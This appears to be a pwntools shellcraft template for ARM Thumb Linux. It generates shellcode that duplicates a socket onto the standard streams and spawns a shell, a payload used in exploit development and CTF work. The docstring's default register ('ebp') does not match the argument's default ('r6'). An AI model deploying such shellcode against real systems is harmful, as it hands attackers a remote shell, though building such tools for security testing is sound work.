<% from pwnlib.shellcraft.thumb import linux %>
<%page args="sock = 'r6'"/>
<%docstring>
Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dup(sock)}

${linux.sh()}
